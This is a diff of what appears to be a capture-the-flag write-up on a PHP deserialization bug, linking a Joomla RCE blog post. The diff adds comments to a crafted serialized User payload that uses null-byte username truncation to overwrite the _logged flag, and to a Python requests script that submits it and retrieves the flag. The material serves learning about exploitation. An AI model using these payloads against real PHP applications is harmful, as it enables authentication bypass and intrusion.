@@ -1,3 +1,5 @@
+Idea: https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/
+
 Debug file:
 
 ```php
@@ -38,6 +40,8 @@ class User
     }
 }
 
+  // Overflow: username truncated -> overflow the password, user password to overwrite logged then use email to wrap the rest
+
   //$serialize_data = 'O:4:"User":4:{s:12:"'.chr(0).'*'.chr(0).'_username";s:5:"guest";s:12:"'.chr(0).'*'.chr(0).'_password";s:5:"guest";s:10:"'.chr(0).'*'.chr(0).'_logged";b:1;s:9:"'.chr(0).'*'.chr(0).'_email";s:43:"s:10:"'.chr(0).'*'.chr(0).'_logged";b:0;s:9:"'.chr(0).'*'.chr(0).'_email";s:0:"";}';
   //$serialize_data = 'O:4:"User":4:{s:12:"'.chr(0).'*'.chr(0).'_username";s:60:"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";s:12:"\0\0\0_password";s:87:"gu";s:12:"\0\0\0_password";s:3:"gue";s:10:"\0\0\0_logged";b:1;s:9:"\0\0\0_email";s:43:"s:10:"'.chr(0).'*'.chr(0).'_logged";b:0;s:9:"'.chr(0).'*'.chr(0).'_email";s:0:"";}';
   $username = '\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0';
@@ -73,6 +77,6 @@ data = {
   'submit': 'login'
 }
 
-requests.post(url, cookies=cookies, data=data)
-print(requests.get(url, cookies=cookies).text)
+requests.post(url, cookies=cookies, data=data) # storeUserSession
+print(requests.get(url, cookies=cookies).text) # getUserSession and retrieve flag
 ```
